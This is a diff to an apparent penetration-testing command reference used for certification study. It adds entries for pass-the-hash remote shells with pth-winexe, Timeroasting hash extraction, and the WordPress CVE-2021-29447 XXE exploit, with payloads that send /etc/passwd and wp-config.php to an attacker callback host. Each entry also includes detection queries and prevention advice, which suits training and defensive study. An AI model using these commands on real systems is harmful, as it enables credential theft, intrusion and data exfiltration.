+            "tuning": "Alert when Schannel logon is followed by privileged group modification within 5 minutes"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -117757,6 +118766,78 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Gets a SYSTEM shell on a remote host using a Kerberos ticket (pass-the-ticket):\n  psexec.py                impacket's service-based remote execution\n  <domain>/<user>@<target_fqdn>   the account and target (FQDN required for Kerberos)\n  -k                       authenticate with the ticket in KRB5CCNAME\n  -no-pass                 do not prompt for a password\n  -target-ip <target_ip>   resolve the host to this IP\nUsed after an ExtraSids golden ticket or NoPac; wmiexec/smbexec are quieter alternatives with the same -k -no-pass."
+    },
+    {
+      "id": "pth-winexe",
+      "name": "pth-winexe - Pass-the-Hash Remote Execution",
+      "command": "pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<target> cmd.exe",
+      "description": "pth-winexe is a pass-the-hash variant of winexe that authenticates to a Windows host using NTLM hashes instead of a password. It opens a remote command shell via the Windows Service Control Manager (like psexec). Alternative to impacket-psexec when you have an NTLM hash and want a quick interactive shell.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Lateral Movement",
+      "subcategory": "Pass-the-Hash",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "HTB Jeeves engagement",
+      "tags": [
+        "pass-the-hash",
+        "pth",
+        "winexe",
+        "remote-execution",
+        "ntlm",
+        "lateral-movement"
+      ],
+      "mitre": [
+        "T1550.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<target> cmd.exe\n\n=== WORKGROUP (non-domain) ===\n  pth-winexe -U 'JEEVES/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.129.228.112 cmd.exe\n\n=== WITH SYSTEM SHELL ===\n  pth-winexe --system -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:<nt_hash>' //<target> cmd.exe\n\n=== ALTERNATIVES ===\n  impacket-psexec -hashes <lm>:<nt> <domain>/<user>@<target>     # more common\n  impacket-wmiexec -hashes <lm>:<nt> <domain>/<user>@<target>    # stealthier\n  evil-winrm -i <target> -u <user> -H <nt_hash>                 # if WinRM open\n\n=== NOTES ===\n- LM hash is usually aad3b435b51404eeaad3b435b51404ee (empty/disabled)\n- Uses SMB + service creation (same as psexec) - leaves artifacts\n- Requires admin access on the target\n- pth-winexe is from the pth-toolkit (passing-the-hash.com)\n- Less maintained than impacket alternatives but still works",
+      "examples": [
+        {
+          "label": "PTH to get Administrator shell",
+          "command": "pth-winexe -U 'JEEVES/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.129.228.112 cmd.exe"
+        },
+        {
+          "label": "PTH with --system flag for SYSTEM shell",
+          "command": "pth-winexe --system -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:<nt_hash>' //<target> cmd.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "pth-toolkit",
+          "url": "https://github.com/byt3bl33d3r/pth-toolkit"
+        },
+        {
+          "title": "MITRE T1550.002 - Pass the Hash",
+          "url": "https://attack.mitre.org/techniques/T1550/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "keepass2john-crack",
+          "note": "KeePass database may contain the NTLM hash needed for PTH.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "NTLM authentication accepts the hash directly without knowing the cleartext password. pth-winexe creates a Windows service on the target to execute commands, authenticating with the provided NTLM hash.",
+        "prerequisites": "Local admin NTLM hash; SMB (445) access to the target; admin$ share accessible.",
+        "impact": "Remote code execution as the hash owner (typically SYSTEM via service creation).",
+        "detection": "[MITRE T1550.002] Event 4624 (logon type 3) with NTLM auth from unusual source; Event 7045 (new service) for the execution service; Event 4688 for cmd.exe spawned by the service.",
+        "artifacts": "4624 NTLM logon; 7045 service creation; 4688 process creation; temporary service binary on admin$ share.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 LogonType=3 AuthenticationPackageName=\"NTLM\"\n| table _time, TargetUserName, IpAddress, WorkstationName",
+        "elastic_kql": "event.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND winlog.event_data.AuthenticationPackageName:\"NTLM\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == \"NTLM\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, Workstation=WorkstationName",
+        "prevention": "Enable Credential Guard; disable NTLM where possible; restrict local admin access; monitor for service creation from unusual sources.",
+        "sources": [
+          "HTB Jeeves",
+          "https://attack.mitre.org/techniques/T1550/002/"
+        ]
+      }
     },
     {
       "id": "ptunnel-ng",
@@ -153417,6 +154498,97 @@ const COMMAND_DATA = {
       "explain": "Forges an ExtraSids golden ticket from Linux with impacket:\n  ticketer.py              build a golden ticket offline\n  -nthash <child_krbtgt_hash>   the child krbtgt NT hash that signs it (use -aesKey for AES)\n  -domain <child_domain> -domain-sid <child_sid>   the child domain and SID\n  -extra-sid <parent_EA_sid>   the parent Enterprise Admins SID added to SID History\n  Administrator            the username baked into the ticket\nExport KRB5CCNAME to the resulting .ccache and psexec the parent DC as EA."
     },
     {
+      "id": "ad-timeroasting",
+      "name": "Timeroasting (Unauthenticated NTP Hash Extraction)",
+      "command": "sudo python3 /tmp/timeroast/timeroast.py <dc_ip> -o timeroast_hashes.txt",
+      "description": "Timeroasting abuses MS-SNTP (Microsoft's authenticated NTP extension) to extract crackable hashes for every computer account in the domain, without any credentials. Computer accounts normally have random 120-char passwords (uncrackable), but appliances, IoT devices, or accounts joined with weak passwords can be cracked. The last unauthenticated stone to turn.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Active Directory",
+      "subcategory": "Credential Harvesting",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "HTU engagement playbook; SecuraBV/Timeroast",
+      "tags": [
+        "timeroasting",
+        "ntp",
+        "ms-sntp",
+        "unauthenticated",
+        "computer-accounts",
+        "offline-cracking"
+      ],
+      "mitre": [
+        "T1558"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nMS-SNTP signs NTP responses with the computer account's password hash.\nTimeroast sends NTP requests for each RID, and the DC responds with a\nsigned value that can be cracked offline. No credentials needed.\n\n=== INSTALL ===\n  git clone https://github.com/SecuraBV/Timeroast /tmp/timeroast\n\n=== RUN ===\n  sudo python3 /tmp/timeroast/timeroast.py <dc_ip> -o timeroast_hashes.txt\n\n=== CRACK ===\n  hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt --username\n  # --username tells hashcat the 'RID:' prefix is a username, not part of the hash\n  # Without --username you get 'token length exception'\n\n=== WHEN IT MATTERS ===\nMachine passwords are normally random 120-char strings - uncrackable.\nBut if a device was domain-joined with a weak password (appliances,\nIoT, old servers, manually set machine passwords), timeroasting cracks it.\nIt is the LAST unauthenticated check after kerbrute + AS-REP roast.\n\n=== REQUIRES ===\n- Root/sudo (raw NTP socket)\n- Port 123/UDP open to the DC\n- MS-SNTP enabled (default on Windows DCs)",
+      "examples": [
+        {
+          "label": "Extract NTP hashes from domain controller",
+          "command": "sudo python3 /tmp/timeroast/timeroast.py 192.168.20.2 -o timeroast_hashes.txt"
+        },
+        {
+          "label": "Crack timeroast hashes with hashcat",
+          "command": "hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt --username"
+        },
+        {
+          "label": "Clone the timeroast tool",
+          "command": "git clone https://github.com/SecuraBV/Timeroast /tmp/timeroast"
+        }
+      ],
+      "references": [
+        {
+          "title": "SecuraBV Timeroast",
+          "url": "https://github.com/SecuraBV/Timeroast"
+        },
+        {
+          "title": "Secura Blog - Timeroasting",
+          "url": "https://www.secura.com/blog/timeroasting-trustworthy-by-design"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-kerbrute-userenum",
+          "note": "Kerbrute finds valid users; timeroasting targets computer accounts. Together they cover the full unauthenticated enumeration surface.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MS-SNTP uses the computer account's NT hash to sign NTP responses. The signed value is extractable from the NTP reply and crackable offline with hashcat mode 31300.",
+        "prerequisites": "Network access to the DC on UDP 123; no credentials required.",
+        "impact": "Recovery of computer account passwords if they are weak (appliances, manually joined devices).",
+        "detection": "[MITRE T1558] Large volume of NTP requests from a single source with varying RIDs; no native Windows event for this.",
+        "artifacts": "Network capture showing rapid NTP queries to the DC; cracked computer account hashes.",
+        "splunk_spl": "index=network sourcetype=sntp dest_port=123 dest=<dc_ip>\n| stats count by src_ip\n| where count > 100\n| sort -count",
+        "elastic_kql": "destination.port:123 AND destination.ip:<dc_ip>",
+        "sentinel_kql": "CommonSecurityLog\n| where DestinationPort == 123 and DestinationIP == '<dc_ip>'\n| summarize RequestCount=count() by SourceIP\n| where RequestCount > 100",
+        "sigma_rules": "net_ntp_timeroasting_rapid_requests",
+        "prevention": "Disable MS-SNTP if not needed (requires registry change); use strong random machine passwords (default behavior); monitor NTP traffic for anomalous volumes.",
+        "sources": [
+          "HTU engagement playbook",
+          "https://attack.mitre.org/techniques/T1558/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Timeroasting - rapid NTP enumeration",
+            "logic": "title: Rapid NTP Authentication Requests (Timeroasting)\nstatus: experimental\nlogsource:\n  category: network\n  product: any\ndetection:\n  selection:\n    dst_port: 123\n  condition: selection | count() by src_ip > 100\nlevel: medium",
+            "data_source": "network-flow",
+            "attack": [
+              "T1558"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "NTP clients with multiple time sources; network time synchronization tools",
+            "tuning": "Threshold on request count per source IP per minute; exclude known NTP clients"
+          }
+        ]
+      }
+    },
+    {
       "type": "reference",
       "platform": "linux",
       "requires": [
@@ -177374,6 +178546,81 @@ const COMMAND_DATA = {
       "explain": "Uses the PHP filter wrapper to base64-encode a source file before it is returned, so PHP/XML special characters do not break parsing and the source (e.g. index.php, connection.php) is disclosed int...:\n  <file>  file path\nDecode the returned string with: echo '<b64>' | base64 -d."
     },
     {
+      "id": "xxe-wav-wordpress-cve-2021-29447",
+      "name": "XXE via WAV Upload - WordPress CVE-2021-29447",
+      "command": "curl -X POST http://<target>/wp-admin/async-upload.php -H 'Cookie: <auth_cookie>' -F 'action=upload-attachment' -F 'async-upload=@payload.wav'",
+      "description": "CVE-2021-29447 is an XXE in WordPress's media upload handling. WordPress uses the PHP XML parser to read metadata from WAV files (iXML chunk). A malicious WAV with an XXE payload in the iXML section triggers the parser to fetch an external DTD, which exfiltrates local files (wp-config.php, /etc/passwd) via base64 encoding through an HTTP callback.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "XXE",
+      "certifications": [
+        "OSCP",
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "HTB MetaTwo engagement; CVE-2021-29447",
+      "tags": [
+        "xxe",
+        "wordpress",
+        "wav",
+        "file-read",
+        "cve-2021-29447",
+        "media-upload",
+        "xml-injection"
+      ],
+      "mitre": [
+        "T1190",
+        "T1005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nWordPress parses iXML metadata inside WAV files using PHP's XML parser.\nA crafted WAV with an XXE payload in the iXML chunk makes the parser\nfetch an external DTD from your server, which exfiltrates local files\nas base64-encoded data via HTTP callback.\n\n=== STEP 1: CREATE THE MALICIOUS WAV ===\n  # payload.wav = minimal WAV header + iXML chunk with XXE\n  # The iXML chunk contains:\n  #   <?xml version=\"1.0\"?><!DOCTYPE ANY[\n  #     <!ENTITY % remote SYSTEM 'http://<attacker_ip>:8080/evil.dtd'>\n  #     %remote;%init;%trick;\n  #   ]>\n\n=== STEP 2: CREATE THE DTD (evil.dtd) ===\n  <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://<attacker_ip>:8080/?p=%file;'>\">\n\n=== STEP 3: HOST THE DTD ===\n  python3 -m http.server 8080\n\n=== STEP 4: UPLOAD THE WAV ===\n  Upload payload.wav via WordPress Media Library (requires Author+ role)\n\n=== STEP 5: DECODE THE EXFILTRATED DATA ===\n  # The base64 data arrives as a query parameter on your HTTP server\n  echo '<base64_data>' | base64 -d\n\n=== COMMON FILES TO EXFILTRATE ===\n  /etc/passwd\n  /var/www/html/wp-config.php  (or ../wp-config.php relative)\n  ~/.ssh/id_rsa\n\n=== NOTES ===\n- Requires at least Author-level WordPress access (can upload media)\n- php://filter/convert.base64-encode avoids XML parsing errors on binary content\n- The DTD must be hosted on your server - WordPress fetches it\n- WordPress 5.6-5.7.1 are vulnerable (fixed in 5.7.2)",
+      "examples": [
+        {
+          "label": "Create evil.dtd to read /etc/passwd",
+          "command": "echo '<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM '\"'\"'http://10.10.16.3:8080/?p=%file;'\"'\"'>\">' > evil.dtd"
+        },
+        {
+          "label": "Create evil.dtd to read wp-config.php",
+          "command": "echo '<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php\">\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM '\"'\"'http://10.10.16.3:8080/?p=%file;'\"'\"'>\">' > evil.dtd"
+        },
+        {
+          "label": "Host the DTD on your attack box",
+          "command": "python3 -m http.server 8080"
+        },
+        {
+          "label": "Decode exfiltrated base64 data",
+          "command": "echo '<base64_data>' | base64 -d"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2021-29447",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2021-29447"
+        },
+        {
+          "title": "WPScan - WordPress XXE",
+          "url": "https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WordPress uses PHP's libxml to parse iXML metadata inside uploaded WAV files. The parser resolves external entities by default, allowing an attacker to include a remote DTD that exfiltrates local file contents via HTTP callbacks.",
+        "prerequisites": "WordPress 5.6-5.7.1; Author-level (or higher) access to upload media; PHP compiled with libxml and external entity loading enabled.",
+        "impact": "Arbitrary local file read - typically wp-config.php (database credentials, secret keys) and /etc/passwd (user enumeration).",
+        "detection": "[MITRE T1190] Web server logs showing WAV upload followed by outbound HTTP requests to external hosts from the PHP process; unusual iXML content in uploaded media files.",
+        "artifacts": "Malicious WAV file in wp-content/uploads; outbound HTTP request to attacker's DTD server; base64-encoded file contents in access logs.",
+        "splunk_spl": "index=web sourcetype=access_combined uri_path=\"*async-upload*\" method=POST\n| table _time, src_ip, uri_path, status\n\nindex=network sourcetype=proxy dest_port=8080\n| where src=<webserver_ip>\n| table _time, dest, uri_path",
+        "elastic_kql": "url.path:*async-upload* AND http.request.method:POST",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem contains \"async-upload\" and csMethod == \"POST\"\n| project TimeGenerated, cIP, csUriStem, scStatus",
+        "prevention": "Update WordPress to 5.7.2+; disable XML external entity loading in PHP (libxml_disable_entity_loader(true)); restrict media upload to trusted roles; monitor outbound HTTP from web servers.",
+        "sources": [
+          "HTB MetaTwo",
+          "https://attack.mitre.org/techniques/T1190/"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -177800,8 +179047,8 @@ const COMMAND_DATA = {
       "explain": "Zeek-based intrusion detection using conn.log, dns.log, smb_files.log, and dce_rpc.log.\nKey techniques: beaconing detection via regular conn.log connection intervals (PowerShell Empire every 5s), DNS exfiltration via high-entropy subdomain enumeration in dns.log, TLS exfiltration via ...\n=== EXAMPLE 1: BEACONING DETECTION (PowerShell Empire) ===\nIndicator: malware beaconing = periodic, regular outbound connections to C2\n\nPCAP: /home/htb-student/pcaps/psempire.pcap\nTool: /usr/local/..."
     }
   ],
-  "totalCommands": 950,
-  "buildDate": "2026-10-06T21:49:19.760Z",
+  "totalCommands": 964,
+  "buildDate": "2026-11-10T12:22:24.493Z",
   "certifications": [
     "CDSA",
     "CPTS",
